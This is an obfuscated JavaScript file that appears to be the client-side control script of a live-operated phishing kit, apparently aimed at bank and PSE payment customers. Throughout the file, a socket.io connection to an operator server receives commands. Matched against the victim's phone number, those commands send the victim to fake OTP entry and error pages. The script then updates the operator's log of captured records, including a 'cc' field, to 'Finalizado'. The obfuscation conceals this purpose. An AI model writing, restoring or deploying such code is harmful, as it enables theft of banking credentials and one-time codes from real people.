const _0x44c2b7 = _0xe0d5;
(function (_0x54db97, _0x3da3f7) {
  const _0x1f8cd6 = _0xe0d5,
    _0x41b586 = _0x54db97();
  while (!![]) {
    try {
      const _0x37dbdf =
        -parseInt(_0x1f8cd6(0x1f7)) / 0x1 +
        parseInt(_0x1f8cd6(0x1f3)) / 0x2 +
        parseInt(_0x1f8cd6(0x1e5)) / 0x3 +
        (parseInt(_0x1f8cd6(0x1f2)) / 0x4) *
          (-parseInt(_0x1f8cd6(0x1eb)) / 0x5) +
        (-parseInt(_0x1f8cd6(0x1f0)) / 0x6) *
          (parseInt(_0x1f8cd6(0x1e9)) / 0x7) +
        parseInt(_0x1f8cd6(0x1e4)) / 0x8 +
        parseInt(_0x1f8cd6(0x1de)) / 0x9;
      if (_0x37dbdf === _0x3da3f7) break;
      else _0x41b586["push"](_0x41b586["shift"]());
    } catch (_0xaa7bb) {
      _0x41b586["push"](_0x41b586["shift"]());
    }
  }
})(_0x4963, 0x325f2);
var socket = io[_0x44c2b7(0x1ea)](url);
function _0x4963() {
  const _0x2c8336 = [
    "json",
    "href",
    "application/json",
    "logs",
    "3648vDTyFW",
    "Finalizado",
    "1098956OMSyXE",
    "768318lUCoQN",
    "./index.error.html",
    "metaInfo",
    "newdin",
    "111812msWplh",
    "PUT",
    "telnum",
    "1134729vKERIG",
    "location",
    "valor",
    "Usuario\x20encontrado",
    "din",
    "reg",
    "2792600kRLRQh",
    "132738HpgoOP",
    "log",
    "/logs/logs",
    "valid",
    "3577DFavGq",
    "connect",
    "5zwtIgw",
  ];
  _0x4963 = function () {
    return _0x2c8336;
  };
  return _0x4963();
}
function _0xe0d5(_0x3bcf10, _0x15946f) {
  const _0x4963be = _0x4963();
  return (
    (_0xe0d5 = function (_0xe0d509, _0x229b1d) {
      _0xe0d509 = _0xe0d509 - 0x1de;
      let _0x3340b4 = _0x4963be[_0xe0d509];
      return _0x3340b4;
    }),
    _0xe0d5(_0x3bcf10, _0x15946f)
  );
}
socket["on"](_0x44c2b7(0x1ef), function (_0x335335) {
  const _0x361197 = _0x44c2b7;
  if (
    _0x335335[_0x361197(0x1e0)] == "us" &&
    _0x335335[_0x361197(0x1e8)] == info["metaInfo"]["telnum"]
  )
    window[_0x361197(0x1df)][_0x361197(0x1ed)] = _0x361197(0x1f4);
  else {
    if (
      _0x335335[_0x361197(0x1e0)] == _0x361197(0x1e2) &&
      _0x335335[_0x361197(0x1e8)] == info["metaInfo"][_0x361197(0x1f9)]
    )
      window[_0x361197(0x1df)][_0x361197(0x1ed)] = "./otp.html";
    else {
      if (
        _0x335335["valor"] == _0x361197(0x1f6) &&
        _0x335335[_0x361197(0x1e8)] == info[_0x361197(0x1f5)][_0x361197(0x1f9)]
      )
        window[_0x361197(0x1df)][_0x361197(0x1ed)] = "./otp.error.html";
      else {
        if (
          _0x335335["valor"] == "finish" &&
          _0x335335[_0x361197(0x1e8)] == info[_0x361197(0x1f5)]["telnum"]
        ) {
          async function _0x4c2ac0() {
            const _0x115835 = _0x361197,
              _0x220d7 = await fetch(url + _0x115835(0x1e7), {
                method: "GET",
                headers: { "Content-Type": _0x115835(0x1ee) },
              }),
              _0x400600 = await _0x220d7["json"](),
              _0x48d985 = [..._0x400600];
            for (const _0x2c931f of _0x48d985) {
              if (
                _0x2c931f[_0x115835(0x1e3)] == info["metaInfo"]["cc"] &&
                _0x2c931f["cl"] == info[_0x115835(0x1f5)]["telnum"]
              ) {
                console[_0x115835(0x1e6)](_0x115835(0x1e1));
                const _0x38d947 = await fetch(
                    url + "/logs/logFinish/" + _0x2c931f["idreg"],
                    {
                      method: _0x115835(0x1f8),
                      headers: { "Content-Type": _0x115835(0x1ee) },
                      body: JSON["stringify"]({ status: _0x115835(0x1f1) }),
                    }
                  ),
                  _0x481c38 = await _0x38d947[_0x115835(0x1ec)]();
              }
            }
            window[_0x115835(0x1df)]["href"] = "./errorPse.html";
          }
          _0x4c2ac0();
          return;
        }
      }
    }
  }
});
